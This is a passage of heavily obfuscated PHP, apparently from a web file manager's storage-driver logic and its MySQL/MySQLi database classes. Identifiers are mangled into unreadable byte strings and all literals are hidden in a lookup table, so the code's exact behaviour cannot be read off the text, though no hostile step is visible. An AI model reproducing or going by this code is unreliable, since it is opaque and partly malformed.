(empty($»–î•½[$Şé™èß£[6]])) { return; } $¾îôš¼¬ = $»–î•½[$Şé™èß£[6]]; if (!is_array($¾îôš¼¬)) { $¾îôš¼¬ = json_decode($¾îôš¼¬, !0); } $Ê•¯š¡ = $Şé™èß£[12]; $ñ —ŒÉ = array($Şé™èß£[2319], $Şé™èß£[2320], $Şé™èß£[971]); foreach ($ñ —ŒÉ as $ä¦‰ñ“æ) { if (isset($¾îôš¼¬[$ä¦‰ñ“æ])) { $Ê•¯š¡ = $ä¦‰ñ“æ; break; } } if (!$Ê•¯š¡) { return; } $íÂÉ‰â© = $this->getConfig($òæÁˆ…); $‰İ»Ğª = $íÂÉ‰â©[$Ê•¯š¡]; $€Š­‹ñ‹ = $¾îôš¼¬[$Ê•¯š¡]; if ($€Š­‹ñ‹ == str_repeat($Şé™èß£[232], strlen($‰İ»Ğª))) { $¾îôš¼¬[$Ê•¯š¡] = $‰İ»Ğª; $»–î•½[$Şé™èß£[6]] = json_encode($¾îôš¼¬); } else { if ($€Š­‹ñ‹ != $‰İ»Ğª) { $»–î•½[$Şé™èß£[2318]] = $Şé™èß£[101]; } } } public function checkConfig(&$˜”Œ—÷Ë, $œîåØÙ˜ = false) { $í¬ˆú¡ú =& $_SERVER[¼èá¯æÙ]; $ƒ›†©ÈØ = strtolower($˜”Œ—÷Ë[$í¬ˆú¡ú[108]]); $€•Œ¤¬³ = $˜”Œ—÷Ë[$í¬ˆú¡ú[6]]; if (!is_array($€•Œ¤¬³)) { $€•Œ¤¬³ = json_decode($€•Œ¤¬³, !0); } foreach ($€•Œ¤¬³ as $í×Ö¨—× => $Ş™õáâÖ) { if (is_string($Ş™õáâÖ)) { $€•Œ¤¬³[$í×Ö¨—×] = trim($Ş™õáâÖ); } } $€•Œ¤¬³[$í¬ˆú¡ú[2321]] = rand_string(6); $Ñ€ªËÊû = $GLOBALS[$í¬ˆú¡ú[6]][$í¬ˆú¡ú[102]][$í¬ˆú¡ú[908]]; $ü„Ğ = isset($Ñ€ªËÊû[$ƒ›†©ÈØ]) ? $Ñ€ªËÊû[$ƒ›†©ÈØ] : ucfirst($ƒ›†©ÈØ); $ˆÖ‘ = $í¬ˆú¡ú[87] . $ü„Ğ; if (!$ü„Ğ || !class_exists($ˆÖ‘)) { if ($œîåØÙ˜) { return LNG($í¬ˆú¡ú[2322]); } write_log(array($í¬ˆú¡ú[2323], $˜”Œ—÷Ë, get_caller_info()), $í¬ˆú¡ú[225]); show_json(LNG($í¬ˆú¡ú[2322]), !1, $˜”Œ—÷Ë); } $È²âÛ˜´ = new $ˆÖ‘($€•Œ¤¬³); if (in_array($ƒ›†©ÈØ, $È²âÛ˜´->objectDriver)) { try { if (!$È²âÛ˜´->isBucketCors() && !$È²âÛ˜´->setBucketCors()) { $Ë †Ôö« = LNG($í¬ˆú¡ú[2324]); $Ë †Ôö« .= $í¬ˆú¡ú[2325] . LNG($í¬ˆú¡ú[2326]); } } catch (Exception $ü ç±ĞĞ) { $Ë †Ôö« = $ü ç±ĞĞ->getMessage(); } if (isset($Ë †Ôö«)) { return $this->_parseError($Ë †Ôö«, $ƒ›†©ÈØ, $œîåØÙ˜); } if ($ƒ›†©ÈØ == $í¬ˆú¡ú[78] && !$È²âÛ˜´->checkRegion()) { return $this->_parseError(LNG($í¬ˆú¡ú[2327]), $ƒ›†©ÈØ, $œîåØÙ˜); } } $ıı¶Ğ£ù = rtrim($€•Œ¤¬³[$í¬ˆú¡ú[1267]], $í¬ˆú¡ú[8]) . $í¬ˆú¡ú[8]; $ƒì»¼ = $È²âÛ˜´->getPath($ıı¶Ğ£ù . $í¬ˆú¡ú[1271]); try { if ($ƒ›†©ÈØ == $í¬ˆú¡ú[119]) { $È²âÛ˜´->mkdir($ıı¶Ğ£ù); } $È‡Â›Ó = $È²âÛ˜´->mkfile($ƒì»¼); if (!$È‡Â›Ó) { $Ë †Ôö« = LNG($í¬ˆú¡ú[2324]); } } catch (Exception $ü ç±ĞĞ) { $Ë †Ôö« = $ü ç±ĞĞ->getMessage(); } if (isset($Ë †Ôö«)) { return $this->_parseError($Ë †Ôö«, $ƒ›†©ÈØ, $œîåØÙ˜); } $€•Œ¤¬³[$í¬ˆú¡ú[1267]] = $ıı¶Ğ£ù; $˜”Œ—÷Ë[$í¬ˆú¡ú[6]] = json_encode($€•Œ¤¬³); $˜”Œ—÷Ë[$í¬ˆú¡ú[108]] = $ü„Ğ; return !0; } private function _parseError($†Éç•¾ç, $÷ÍúÂ…™, $šÇã¾ŒÚ = false) { $È÷”ÄÕö =& $_SERVER[¼èá¯æÙ]; if ($÷ÍúÂ…™ == $È÷”ÄÕö[78] && stripos($†Éç•¾ç, $È÷”ÄÕö[2328])) { $çÙ¨­İ“ = explode($È÷”ÄÕö[10], $†Éç•¾ç); $ªÏËåú¨ = isset($çÙ¨­İ“[1]) ? $çÙ¨­İ“[1] : $È÷”ÄÕö[12]; $§“‹çÆù = array($È÷”ÄÕö[2329] => LNG($È÷”ÄÕö[2330]), $È÷”ÄÕö[2331] => LNG($È÷”ÄÕö[2332])); if (isset($§“‹çÆù[$ªÏËåú¨])) { $†Éç•¾ç = $§“‹çÆù[$ªÏËåú¨]; } } if (stripos($†Éç•¾ç, $È÷”ÄÕö[2333]) === 0) { $çÈ¤¡Ü† = strpos($†Éç•¾ç, $È÷”ÄÕö[188]); if ($çÈ¤¡Ü† === !1) { $çÈ¤¡Ü† = strpos($†Éç•¾ç, $È÷”ÄÕö[4]); } if ($çÈ¤¡Ü† !== !1) { $†Éç•¾ç = substr($†Éç•¾ç, $çÈ¤¡Ü† + 1); } } $†Éç•¾ç = LNG($È÷”ÄÕö[1274]) . $†Éç•¾ç; if ($šÇã¾ŒÚ) { return $†Éç•¾ç; } show_json($†Éç•¾ç, !1); } public function driverListSystem() { $÷Æ­ş†´ =& $_SERVER[¼èá¯æÙ]; $¨Î¼©ì¶ = parent::listData(); $¹œ ­ˆ« = array(); foreach ($¨Î¼©ì¶ as $Ì–¥ï›ï) { unset($Ì–¥ï›ï[$÷Æ­ş†´[243]], $Ì–¥ï›ï[$÷Æ­ş†´[98]]); if (!is_array($Ì–¥ï›ï[$÷Æ­ş†´[6]])) { $Ì–¥ï›ï[$÷Æ­ş†´[6]] = json_decode($Ì–¥ï›ï[$÷Æ­ş†´[6]], !0); } $¹œ ­ˆ«[] = $Ì–¥ï›ï; } return $¹œ ­ˆ«; } public function defaultDriver() { $óÔ‹´„ =& $_SERVER[¼èá¯æÙ]; $ÊÔğí” = parent::listData(); $‰ë£Õ†« = array_filter_by_field($ÊÔğí”, $óÔ‹´„[37], 1); $‰ë£Õ†« = $‰ë£Õ†«[0]; if (!$‰ë£Õ†«) { return array(); } if (!is_array($‰ë£Õ†«[$óÔ‹´„[6]])) { $‰ë£Õ†«[$óÔ‹´„[6]] = json_decode($‰ë£Õ†«[$óÔ‹´„[6]], !0); } return $‰ë£Õ†«; } public function driverInfo($¤æ·ò¯ç) { $î¶èÍ×Ô =& $_SERVER[¼èá¯æÙ]; $Üç³ŒÙ = array_to_keyvalue(parent::listData(), $î¶èÍ×Ô[486]); if (!isset($Üç³ŒÙ[$¤æ·ò¯ç])) { return !1; } $£™Õı• = $Üç³ŒÙ[$¤æ·ò¯ç]; if (!is_array($£™Õı•[$î¶èÍ×Ô[6]])) { $£™Õı•[$î¶èÍ×Ô[6]] = json_decode($£™Õı•[$î¶èÍ×Ô[6]], !0); } return $£™Õı•; } public function remove($Œ§ŠÔ­µ) { $this->removeShareItems($Œ§ŠÔ­µ); return parent::remove($Œ§ŠÔ­µ); } public function removeWithFile($ŒµÈ÷ü¯, $Ï¹¯‰ÖÇ, $’Ÿó‰âö, $á–™ú¦´ = false) { $ŞÈÎéÈ =& $_SERVER[¼èá¯æÙ]; $ç•€‘ó = array($ŞÈÎéÈ[900] => $ŒµÈ÷ü¯); $±—Æ‘¥µ = Model($ŞÈÎéÈ[555])->where($ç•€‘ó)->count(); $Ôå‡šû = Model($ŞÈÎéÈ[555])->where($ç•€‘ó)->sum($ŞÈÎéÈ[89]); $äõ¨ÒÃÈ = $Ï¹¯‰ÖÇ . $ŞÈÎéÈ[2334] . $ŒµÈ÷ü¯; $í´ŒÀŞ = LNG($Ï¹¯‰ÖÇ == $ŞÈÎéÈ[634] ? $ŞÈÎéÈ[2335] : $ŞÈÎéÈ[2336]); $•Ğãó = new TaskFileTransfer($äõ¨ÒÃÈ, $ŞÈÎéÈ[225], $±—Æ‘¥µ, $í´ŒÀŞ . $ŞÈÎéÈ[473] . $’Ÿó‰âö[$ŞÈÎéÈ[32]] . $ŞÈÎéÈ[224] . $ŒµÈ÷ü¯); $•Ğãó->task[$ŞÈÎéÈ[845]] = (double) $Ôå‡šû; $º¾Ê´Â‡ = KodIO::defaultDriver(); $Ë¦Î¯öÀ = $º¾Ê´Â‡[$ŞÈÎéÈ[486]]; $ıñîÒ € = $Í¢«ùöğ = $ú¶÷èı” = array(); $â–ƒã·² = Model($ŞÈÎéÈ[242])->where($ç•€‘ó)->field($ŞÈÎéÈ[2337])->select(); foreach ($â–ƒã·² as $¹ùºüÄ×) { $ÖµôûéÇ = $¹ùºüÄ×[$ŞÈÎéÈ[552]]; if ($á–™ú¦´) { $Í¢«ùöğ[] = $ÖµôûéÇ; continue; } $ûı§ğ™Ú = $¹ùºüÄ×[$ŞÈÎéÈ[97]]; $ÊàÆ‰¾‚ = get_path_father($ûı§ğ™Ú); $ú¶÷èı”[] = $ÊàÆ‰¾‚; $ÊàÆ‰¾‚ = str_replace("\173\x69\x6f\72{$ŒµÈ÷ü¯}\x7d\57", "\173\151\157\72{$Ë¦Î¯öÀ}\x7d\x2f", $ÊàÆ‰¾‚); if (!IO::exist($ûı§ğ™Ú)) { $ıñîÒ €[] = $ÖµôûéÇ; $•Ğãó->updateFileEnd($¹ùºüÄ×[$ŞÈÎéÈ[32]], $¹ùºüÄ×[$ŞÈÎéÈ[89]]); write_log($ŞÈÎéÈ[2338] . $ûı§ğ™Ú, $ŞÈÎéÈ[1910]); continue; } $¶ø¹ÈÇÔ = IO::move($ûı§ğ™Ú, $ÊàÆ‰¾‚, REPEAT_RENAME); if (!$¶ø¹ÈÇÔ) { $Í¢«ùöğ[] = $ÖµôûéÇ; $•Ğãó->updateFileEnd($¹ùºüÄ×[$ŞÈÎéÈ[32]], $¹ùºüÄ×[$ŞÈÎéÈ[89]]); write_log($ŞÈÎéÈ[2339] . $ûı§ğ™Ú, $ŞÈÎéÈ[1910]); continue; } $ç•€‘ó = array($ŞÈÎéÈ[552] => $ÖµôûéÇ); $†øÜèŠÖ = array($ŞÈÎéÈ[900] => $Ë¦Î¯öÀ, $ŞÈÎéÈ[97] => $¶ø¹ÈÇÔ); Model($ŞÈÎéÈ[242])->where($ç•€‘ó)->save($†øÜèŠÖ); } $Œ™¸ñÙğ = $•Ğãó->task; if (!$á–™ú¦´) { Cache::set($äõ¨ÒÃÈ, $Œ™¸ñÙğ); } $•Ğãó->end(); $ıñîÒ € = array_unique($ıñîÒ €); $Í¢«ùöğ = array_unique($Í¢«ùöğ); if (!$á–™ú¦´ && ($ıñîÒ € || $Í¢«ùöğ)) { $¯¥õï´  = array(); if ($ıñîÒ €) { $¯¥õï´ [] = sprintf(LNG($ŞÈÎéÈ[2340]), count($ıñîÒ €)); } if ($Í¢«ùöğ) { $¯¥õï´ [] = sprintf(LNG($ŞÈÎéÈ[2341]), count($Í¢«ùöğ)); } $¯¥õï´  = sprintf(LNG($ŞÈÎéÈ[2342]), implode($ŞÈÎéÈ[2343], $¯¥õï´ )) . $ŞÈÎéÈ[2344] . date($ŞÈÎéÈ[2345]) . $ŞÈÎéÈ[2346]; if ($Ï¹¯‰ÖÇ == $ŞÈÎéÈ[1947]) { $¯¥õï´  .= $ŞÈÎéÈ[2347] . LNG($ŞÈÎéÈ[2348]); } else { $¯¥õï´  = LNG($ŞÈÎéÈ[2349]) . $ŞÈÎéÈ[2350] . $¯¥õï´ ; } $Œ™¸ñÙğ[$ŞÈÎéÈ[1269]] = $¯¥õï´ ; Cache::set($äõ¨ÒÃÈ, $Œ™¸ñÙğ); unset($’Ÿó‰âö[$ŞÈÎéÈ[6]]); $‰¼ñî‰ = array($ŞÈÎéÈ[486] => $ŒµÈ÷ü¯, $ŞÈÎéÈ[2221] => $ŞÈÎéÈ[634], $ŞÈÎéÈ[32] => $’Ÿó‰âö[$ŞÈÎéÈ[32]], $ŞÈÎéÈ[108] => $’Ÿó‰âö[$ŞÈÎéÈ[108]]); Hook::trigger($ŞÈÎéÈ[1789], array($ŞÈÎéÈ[1292] => $‰¼ñî‰, $ŞÈÎéÈ[1302] => !0)); show_json($¯¥õï´ , !1, 100111); } if ($Ï¹¯‰ÖÇ == $ŞÈÎéÈ[634]) { return !0; } if ($ıñîÒ € || $Í¢«ùöğ) { $íò£Â‡Ğ = array_merge($ıñîÒ €, $Í¢«ùöğ); $íò£Â‡Ğ = array_filter(array_unique($íò£Â‡Ğ)); $this->removeByFileID($íò£Â‡Ğ); } if ($ú¶÷èı”) { $ú¶÷èı” = array_filter(array_unique($ú¶÷èı”)); foreach ($ú¶÷èı” as $ûı§ğ™Ú) { $ƒÄ›ö‰ = IO::has($ûı§ğ™Ú, !0); if (!$ƒÄ›ö‰[$ŞÈÎéÈ[251]] && !$ƒÄ›ö‰[$ŞÈÎéÈ[252]]) { IO::remove($ûı§ğ™Ú); } } } return $this->remove($ŒµÈ÷ü¯); } private function removeByFileID($™²õÒŠ– = array()) { $‰Šé›¬ =& $_SERVER[¼èá¯æÙ]; if (empty($™²õÒŠ–)) { return; } $çëŸÆê¸ = array($‰Šé›¬[552] => array($‰Šé›¬[7], $™²õÒŠ–)); $·’²—–Ø = Model($‰Šé›¬[1426])->where($çëŸÆê¸)->field($‰Šé›¬[203])->select(); if (!$·’²—–Ø) { return Model($‰Šé›¬[555])->remove($™²õÒŠ–); } $·’²—–Ø = array_to_keyvalue($·’²—–Ø, $‰Šé›¬[12], $‰Šé›¬[203]); foreach ($·’²—–Ø as $°ã†ŒÁ) { Model($‰Šé›¬[907])->removeNow($°ã†ŒÁ, !1); } } private function removeShareItems($¨»™“ÍŒ) { $ø‚ÚÖı´ =& $_SERVER[¼èá¯æÙ]; $ÁÓÔ«š± = "\x7b\x69\x6f\72{$¨»™“ÍŒ}\175\57"; $ÏÕù™éÊ = array($ø‚ÚÖı´[203] => 0, $ø‚ÚÖı´[1262] => array($ø‚ÚÖı´[470], "{$ÁÓÔ«š±}\x25")); $…òÓÆ© = Model($ø‚ÚÖı´[1958])->where($ÏÕù™éÊ)->field($ø‚ÚÖı´[679])->select(); if (empty($…òÓÆ©)) { return; } $ó‰şˆçú = array_to_keyvalue($…òÓÆ©, $ø‚ÚÖı´[12], $ø‚ÚÖı´[679]); Model($ø‚ÚÖı´[678])->remove($ó‰şˆçú); } } goto CœÅ•‚Ğ£ó; Bƒ¿îÜ‰: class DbMysql extends Db { public function __construct($š‡îØğĞ = '') { $£•äåŞÑ =& $_SERVER[¼èá¯æÙ]; if (!extension_loaded($£•äåŞÑ[887])) { think_exception(think_lang($£•äåŞÑ[14]) . $£•äåŞÑ[967]); } if (!empty($š‡îØğĞ)) { $this->config = $š‡îØğĞ; if (empty($this->config[$£•äåŞÑ[17]])) { $this->config[$£•äåŞÑ[17]] = $£•äåŞÑ[12]; } } } public function connect($äú‚Ì˜ = '', $ëá®Ãö‹ = 0, $“¢ĞÁİ = false) { $±‡”ç¿Ú =& $_SERVER[¼èá¯æÙ]; if (!isset($this->linkID[$ëá®Ãö‹])) { if (empty($äú‚Ì˜)) { $äú‚Ì˜ = $this->config; } $…àŞ˜äÕ = $äú‚Ì˜[$±‡”ç¿Ú[968]] . ($äú‚Ì˜[$±‡”ç¿Ú[969]] ? "\72{$äú‚Ì˜[$±‡”ç¿Ú[969]]}" : $±‡”ç¿Ú[12]); $µÚ¹•ë = !empty($äú‚Ì˜[$±‡”ç¿Ú[17]][$±‡”ç¿Ú[18]]) ? $äú‚Ì˜[$±‡”ç¿Ú[17]][$±‡”ç¿Ú[18]] : $this->pconnect; if ($µÚ¹•ë) { $this->linkID[$ëá®Ãö‹] = mysql_pconnect($…àŞ˜äÕ, $äú‚Ì˜[$±‡”ç¿Ú[970]], $äú‚Ì˜[$±‡”ç¿Ú[971]], 131072); } else { $this->linkID[$ëá®Ãö‹] = mysql_connect($…àŞ˜äÕ, $äú‚Ì˜[$±‡”ç¿Ú[970]], $äú‚Ì˜[$±‡”ç¿Ú[971]], !0, 131072); } if (!$this->linkID[$ëá®Ãö‹] || !empty($äú‚Ì˜[$±‡”ç¿Ú[21]]) && !mysql_select_db($äú‚Ì˜[$±‡”ç¿Ú[21]], $this->linkID[$ëá®Ãö‹])) { think_exception(mysql_error()); } $Ê‚ÀíœÃ = mysql_get_server_info($this->linkID[$ëá®Ãö‹]); mysql_query($±‡”ç¿Ú[972] . think_config($±‡”ç¿Ú[973]) . $±‡”ç¿Ú[68], $this->linkID[$ëá®Ãö‹]); if ($Ê‚ÀíœÃ > $±‡”ç¿Ú[974]) { mysql_query($±‡”ç¿Ú[975], $this->linkID[$ëá®Ãö‹]); } $this->connected = !0; if (1 != think_config($±‡”ç¿Ú[22])) { unset($this->config); } } return $this->linkID[$ëá®Ãö‹]; } public function free() { mysql_free_result($this->queryID); $this->queryID = null; } public function query($Ş¾İßğ) { $»²¼ŸĞ‚ =& $_SERVER[¼èá¯æÙ]; if (0 === stripos($Ş¾İßğ, $»²¼ŸĞ‚[353])) { $this->close(); $this->connected = !1; } $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $Ş¾İßğ; if ($this->queryID) { $this->free(); } think_action_status($»²¼ŸĞ‚[23], 1); think_status($»²¼ŸĞ‚[24]); $this->queryID = mysql_query($Ş¾İßğ, $this->_linkID); $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = mysql_num_rows($this->queryID); return $this->getAll(); } } public function execute($ÃÂÕÊİ¯) { $ÆÚò¨Øü =& $_SERVER[¼èá¯æÙ]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $ÃÂÕÊİ¯; if ($this->queryID) { $this->free(); } think_action_status($ÆÚò¨Øü[25], 1); think_status($ÆÚò¨Øü[24]); $™’ØœĞ² = mysql_query($ÃÂÕÊİ¯, $this->_linkID); $this->debug(); if (!1 === $™’ØœĞ²) { $this->error(); return !1; } else { $this->numRows = mysql_affected_rows($this->_linkID); $this->lastInsID = mysql_insert_id($this->_linkID); return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { mysql_query($_SERVER[¼èá¯æÙ][976], $this->_linkID); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $ú…Åàµ‰ = mysql_query($_SERVER[¼èá¯æÙ][977], $this->_linkID); $this->transTimes = 0; if (!$ú…Åàµ‰) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $Ù¨ü†ÚÓ = mysql_query($_SERVER[¼èá¯æÙ][978], $this->_linkID); $this->transTimes = 0; if (!$Ù¨ü†ÚÓ) { $this->error(); return !1; } } return !0; } private function getAll() { $‰ä®Í‹¾ = array(); if ($this->numRows > 0) { while ($¡–çÎ†£ = mysql_fetch_assoc($this->queryID)) { $‰ä®Í‹¾[] = $¡–çÎ†£; } mysql_data_seek($this->queryID, 0); } return $‰ä®Í‹¾; } public function getFields($ÛŒ ‹«¼) { $¡ÌÀŸ =& $_SERVER[¼èá¯æÙ]; $ı¤ìÌ¸ş = $this->query($¡ÌÀŸ[979] . $this->parseKey($ÛŒ ‹«¼)); $°é„©ï€ = array(); if ($ı¤ìÌ¸ş) { foreach ($ı¤ìÌ¸ş as $Ù€¯˜Ñ– => $Ìµ¸±¹ò) { $°é„©ï€[$Ìµ¸±¹ò[$¡ÌÀŸ[31]]] = array($¡ÌÀŸ[32] => $Ìµ¸±¹ò[$¡ÌÀŸ[31]], $¡ÌÀŸ[33] => $Ìµ¸±¹ò[$¡ÌÀŸ[34]], $¡ÌÀŸ[35] => (bool) (strtoupper($Ìµ¸±¹ò[$¡ÌÀŸ[36]]) === $¡ÌÀŸ[980]), $¡ÌÀŸ[37] => $Ìµ¸±¹ò[$¡ÌÀŸ[38]], $¡ÌÀŸ[39] => strtolower($Ìµ¸±¹ò[$¡ÌÀŸ[40]]) == $¡ÌÀŸ[41], $¡ÌÀŸ[42] => strtolower($Ìµ¸±¹ò[$¡ÌÀŸ[43]]) == $¡ÌÀŸ[44]); } } return $°é„©ï€; } public function getTables($ö‹·Øìñ = '') { $Œ®äÅÀ =& $_SERVER[¼èá¯æÙ]; if (!empty($ö‹·Øìñ)) { $Ë®·ó = $Œ®äÅÀ[981] . $ö‹·Øìñ . $Œ®äÅÀ[982]; } else { $Ë®·ó = $Œ®äÅÀ[983]; } $Ô©œ¥¸ = $this->query($Ë®·ó); $ößïˆÈ– = array(); foreach ($Ô©œ¥¸ as $Š–Àùš… => $Üñ‹Â•õ) { $ößïˆÈ–[$Š–Àùš…] = current($Üñ‹Â•õ); } return $ößïˆÈ–; } public function replace($§û˜å, $ÇÓˆ¦… = array()) { $“óåõËÌ =& $_SERVER[¼èá¯æÙ]; foreach ($§û˜å as $åÉ½ûÙ => $·¥…´Œ¿) { $Ã€äÜÃŸ = $this->parseValue($·¥…´Œ¿); if (is_scalar($Ã€äÜÃŸ)) { $ “§‘¶æ[] = $Ã€äÜÃŸ; $Ñıé¡ûß[] = $this->parseKey($åÉ½ûÙ); } } $À‹šš¢ = $“óåõËÌ[984] . $this->parseTable($ÇÓˆ¦…[$“óåõËÌ[368]]) . $“óåõËÌ[985] . implode($“óåõËÌ[50], $Ñıé¡ûß) . $“óåõËÌ[986] . implode($“óåõËÌ[50], $ “§‘¶æ) . $“óåõËÌ[987]; return $this->execute($À‹šš¢); } public function insertAll($Şì®à¨ú, $¢£ï¶’€ = array(), $”Œ³ô = false) { $ß¦³Ä«“ =& $_SERVER[¼èá¯æÙ]; if (!is_array($Şì®à¨ú[0])) { return !1; } $³ÀÁ†Ë = array_keys($Şì®à¨ú[0]); $ˆ°¹‡ÚÀ = array(); foreach ($Şì®à¨ú as $¹Á¬»Ö™) { $ÏÜ£¸¸ = array(); foreach ($¹Á¬»Ö™ as $à×½°Õ· => $ˆİŠ­Õù) { $ˆİŠ­Õù = $this->parseValue($ˆİŠ­Õù); if (is_scalar($ˆİŠ­Õù)) { $ÏÜ£¸¸[] = $ˆİŠ­Õù; } } $ˆ°¹‡ÚÀ[] = $ß¦³Ä«“[349] . implode($ß¦³Ä«“[50], $ÏÜ£¸¸) . $ß¦³Ä«“[987]; } array_walk($³ÀÁ†Ë, array($this, $ß¦³Ä«“[988])); $ãÀ½¤ü = ($”Œ³ô ? $ß¦³Ä«“[989] : $ß¦³Ä«“[990]) . $ß¦³Ä«“[991] . $this->parseTable($¢£ï¶’€[$ß¦³Ä«“[368]]) . $ß¦³Ä«“[985] . implode($ß¦³Ä«“[50], $³ÀÁ†Ë) . $ß¦³Ä«“[992] . implode($ß¦³Ä«“[50], $ˆ°¹‡ÚÀ); return $this->execute($ãÀ½¤ü); } public function close() { if ($this->_linkID) { mysql_close($this->_linkID); } $this->_linkID = null; } public function error() { $°‡ì¨ı® =& $_SERVER[¼èá¯æÙ]; $this->error = mysql_errno() . $°‡ì¨ı®[4] . mysql_error($this->_linkID); if ($°‡ì¨ı®[12] != $this->queryStr) { $this->error .= LNG($°‡ì¨ı®[48]) . $this->queryStr; } think_trace($this->error, $°‡ì¨ı®[12], $°‡ì¨ı®[49]); return $this->error; } public function escapeString($¸€¼áßÛ) { if ($this->_linkID) { return mysql_real_escape_string($¸€¼áßÛ, $this->_linkID); } else { return mysql_escape_string($¸€¼áßÛ); } } public function parseKey(&$Ñ¶˜‹¶Ú, $Ò°ğß‹Ä = true) { $ÓÄ¯ò…¿ =& $_SERVER[¼èá¯æÙ]; if ($Ò°ğß‹Ä) { $Ñ¶˜‹¶Ú = $this->parseKeyCheck($Ñ¶˜‹¶Ú); } if ($Ñ¶˜‹¶Ú != $ÓÄ¯ò…¿[232] && !preg_match($ÓÄ¯ò…¿[993], $Ñ¶˜‹¶Ú)) { $Ñ¶˜‹¶Ú = $ÓÄ¯ò…¿[472] . trim($Ñ¶˜‹¶Ú, $ÓÄ¯ò…¿[472]) . $ÓÄ¯ò…¿[472]; } return $Ñ¶˜‹¶Ú; } } class DbMysqli extends Db { public function __construct($ô´›çÙ = '') { $äü°é¡ı =& $_SERVER[¼èá¯æÙ]; if (!extension_loaded($äü°é¡ı[994])) { think_exception(think_lang($äü°é¡ı[14]) . $äü°é¡ı[995]); } if (!empty($ô´›çÙ)) { $this->config = $ô´›çÙ; if (empty($this->config[$äü°é¡ı[17]])) { $this->config[$äü°é¡ı[17]] = $äü°é¡ı[12]; } } } public function connect($Åş™ˆßˆ = '', $˜¤óññ¬ = 0) { $çÎ‚‰é =& $_SERVER[¼èá¯æÙ]; if (!isset($this->linkID[$˜¤óññ¬])) { if (empty($Åş™ˆßˆ)) { $Åş™ˆßˆ = $this->config; } $this->linkID[$˜¤óññ¬] = new mysqli($Åş™ˆßˆ[$çÎ‚‰é[968]], $Åş™ˆßˆ[$çÎ‚‰é[970]], $Åş™ˆßˆ[$çÎ‚‰é[971]], $Åş™ˆßˆ[$çÎ‚‰é[21]], $Åş™ˆßˆ[$çÎ‚‰é[969]] ? intval($Åş™ˆßˆ[$çÎ‚‰é[969]]) : 3306); if (mysqli_connect_errno()) { think_exception(mysqli_connect_error()); } $¿©›ƒáñ = $this->linkID[$˜¤óññ¬]->server_version; $this->linkID[$˜¤óññ¬]->query($çÎ‚‰é[972] . think_config($çÎ‚‰é[973]) . $çÎ‚‰é[68]); if ($¿©›ƒáñ > $çÎ‚‰é[974]) { $this->linkID[$˜¤óññ¬]->query($çÎ‚‰é[975]); } $this->connected = !0; if (1 != think_config($çÎ‚‰é[22])) { unset($this->config); } } return $this->linkID[$˜¤óññ¬]; } public function free() { $this->queryID->free_result(); $this->queryID = null; } public function query($ÛÃÄÙæ) { $ñê©áÑ‚ =& $_SERVER[¼èá¯æÙ]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $ÛÃÄÙæ; if ($this->queryID) { $this->free(); } think_action_status($ñê©áÑ‚[23], 1); think_status($ñê©áÑ‚[24]); $this->queryID = $this->_linkID->query($ÛÃÄÙæ); if ($this->_linkID->more_results()) { while (($«¬Õê§¯ = $this->_linkID->next_result()) != NULL) { $«¬Õê§¯->free_result(); } } $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = $this->queryID->num_rows; $this->numCols = $this->queryID->field_count; return $this->getAll(); } } public function execute($ëøŸ®Í…) { $ÉÆšáåî =& $_SERVER[¼èá¯æÙ]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $ëøŸ®Í…; if ($this->queryID) { $this->free(); } think_action_status($ÉÆšáåî[25], 1); think_status($ÉÆšáåî[24]); $Íâà£«œ = $this->_linkID->query($ëøŸ®Í…); $this->debug(); if (!1 === $Íâà£«œ) { $this->error(); return !1; } else { $this->numRows = $this->_linkID->affected_rows; $this->lastInsID = $this->_linkID->insert_id; return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if ($this->transTimes == 0) { $this->_linkID->autocommit(!1); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $ª§áÚÑ = $this->_linkID->commit(); $this->_linkID->autocommit(!0); $this->transTimes = 0; if (!$ª§áÚÑ) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $¸„¼¶ŒÑ = $this->_linkID->rollback(); $this->transTimes = 0; if (!$¸„¼¶ŒÑ) { $this->error(); return !1; } } return !0; } private function getAll() { $Àş‘Û¢ = array(); if ($this->numRows > 0) { for ($à¨¨¦Â = 0; $à¨¨¦Â < $this->numRows; $à¨¨¦Â++) { $Àş‘Û¢[$à¨¨¦Â] = $this->queryID->fetch_assoc(); } $this->queryID->data_seek(0); } return $Àş‘Û¢; } public function getFields($Å“·¦¥Ë) { $¢ŞîÒ¼¦ =& $_SERVER[¼èá¯æÙ]; $Úá¾½”Ê = $this->query($¢ŞîÒ¼¦[979] . $this->parseKey($Å“·¦¥Ë)); $æŠØŞª¥ = array(); if ($Úá¾½”Ê) { foreach ($Úá¾½”Ê as $²Ù¤Âß¾ => $¶ëºÄŞ˜) { $æŠØŞª¥[$¶ëºÄŞ˜[$¢ŞîÒ¼¦[31]]] = array($¢ŞîÒ¼¦[32] => $¶ëºÄŞ˜[$¢ŞîÒ¼¦[31]], $¢ŞîÒ¼¦[33] => $¶ëºÄŞ˜[$¢ŞîÒ¼¦[34]], $¢ŞîÒ¼¦[35] => (bool) ($¶ëºÄŞ˜[$¢ŞîÒ¼¦[36]] === $¢ŞîÒ¼¦[12]), $¢ŞîÒ¼¦[37] => $¶ëºÄŞ˜[$¢ŞîÒ¼¦[38]], $¢ŞîÒ¼¦[39] => strtolower($¶ëºÄŞ˜[$¢ŞîÒ¼¦[40]]) == $¢ŞîÒ¼¦[41], $¢ŞîÒ¼¦[42] => strtolower($¶ëºÄŞ˜[$¢ŞîÒ¼¦[43]]) == $¢ŞîÒ¼¦[44]); } } return $æŠØŞª¥; } public function getTables($‡¾”›¿½ = '') { $Õ±ÅÇˆ =& $_SERVER[¼èá¯æÙ]; $Øı ²õ = !empty($‡¾”›¿½) ? $Õ±ÅÇˆ[981] . $‡¾”›¿½ . $Õ±ÅÇˆ[982] : $Õ±ÅÇˆ[983]; $•´ÔöÚ = $this->query($Øı ²õ); $Ò¢¦¬ƒº = 